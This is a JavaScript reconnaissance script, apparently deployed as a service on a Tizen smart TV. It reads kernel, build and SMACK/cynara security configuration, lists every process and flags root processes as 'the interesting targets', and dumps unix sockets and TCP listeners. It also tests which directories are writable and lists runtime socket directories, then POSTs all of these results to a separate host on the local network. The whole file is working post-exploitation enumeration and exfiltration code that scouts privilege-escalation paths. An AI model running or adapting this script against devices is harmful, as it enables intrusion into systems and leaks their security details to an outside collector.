/* TV Recon service v3 — deep system enumeration. ES5. No process spawning. */
'use strict';

var MAC = '192.168.86.86';
var MAC_PORT = 8080;
var sent = 0;

function post(tag, data) {
    try {
        var http = require('http');
        var body = JSON.stringify({ tag: tag, data: data });
        var req = http.request({
            host: MAC, port: MAC_PORT, path: '/report', method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
        });
        req.on('error', function () {});
        req.end(body);
        sent++;
    } catch (e) { try { console.log('post fail: ' + e); } catch (e2) {} }
}
function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.message ? e.message : String(e)); } }
function read(f) { return T(function () { return require('fs').readFileSync(f, 'utf8').slice(0, 6000); }); }

console.log('TV Recon v3 starting');

/* 1. version info — kernel, build, smack rules */
['/proc/version', '/etc/tizen-build-info', '/etc/version', '/etc/smack/accesses',
 '/etc/smack/load', '/etc/sdbd.conf', '/opt/etc/sdbd.conf', '/etc/sysmgr/smack',
 '/etc/security/cac_containers', '/etc/cynara', '/etc/os-release'].forEach(function (f) {
    post('file', { path: f, content: read(f) });
});

/* 2. child_process availability test — REQUIRE ONLY, NO EXEC */
post('child_process', { available: T(function () { require('child_process'); return 'YES'; }) });

/* 3. ALL unix sockets on the system — every daemon's local endpoint */
post('net-unix', read('/proc/net/unix'));

/* 4. TCP listeners */
post('net-tcp', read('/proc/net/tcp'));

/* 5. full process map — every PID's name, uid, exe */
var fs = require('fs');
var pids = T(function () { return fs.readdirSync('/proc').filter(function (x) { return /^[0-9]+$/.test(x); }); });
var procMap = [];
if (pids instanceof Array) {
    pids.forEach(function (pid) {
        var entry = { pid: pid };
        entry.cmdline = T(function () {
            return fs.readFileSync('/proc/' + pid + '/cmdline', 'utf8').replace(/\0/g, ' ').slice(0, 120);
        });
        entry.status = T(function () {
            var s = fs.readFileSync('/proc/' + pid + '/status', 'utf8');
            var name = s.match(/^Name:\s*(.*)/m);
            var uid = s.match(/^Uid:\s*(\d+)/m);
            var ppid = s.match(/^PPid:\s*(\d+)/m);
            return { name: name ? name[1] : '?', uid: uid ? uid[1] : '?', ppid: ppid ? ppid[1] : '?' };
        });
        procMap.push(entry);
    });
}
post('procmap', { count: procMap.length, procs: procMap });

/* 6. root processes' exes (the interesting targets) */
var rootProcs = [];
if (procMap instanceof Array) {
    procMap.forEach(function (p) {
        if (p.status && p.status.uid === '0') {
            rootProcs.push({ pid: p.pid, name: p.status.name, cmdline: p.cmdline });
        }
    });
}
post('rootprocs', { count: rootProcs.length, procs: rootProcs });

/* 7. writable directories check */
var wr = {};
['/tmp', '/home/owner/share/tmp/sdk_tools', '/home/owner/share/tmp', '/home/owner',
 '/dev/shm', '/run/user/5001', '/opt/usr/home/owner'].forEach(function (d) {
    wr[d] = T(function () {
        var test = d + '/.__tvrecon_test';
        require('fs').writeFileSync(test, 'x');
        require('fs').unlinkSync(test);
        return 'WRITE_OK';
    });
});
post('writable', wr);

/* 8. service runner introspection — what modules does our sandbox have? */
post('sandbox', {
    requirePaths: T(function () { return require.resolve.paths ? require.resolve.paths('fs') : 'n/a'; }),
    mainRequire: T(function () { return typeof mainRequire !== 'undefined' ? 'present' : 'absent'; })
});

/* 9. key-manager / security socket discovery */
['/run', '/run/user', '/run/user/5001', '/var/run'].forEach(function (d) {
    post('fs', { dir: d, listing: T(function () { return fs.readdirSync(d).slice(0, 60); }) });
});

console.log('TV Recon v3: ' + sent + ' reports dispatched');
throw new Error('RECON_CYCLE_COMPLETE');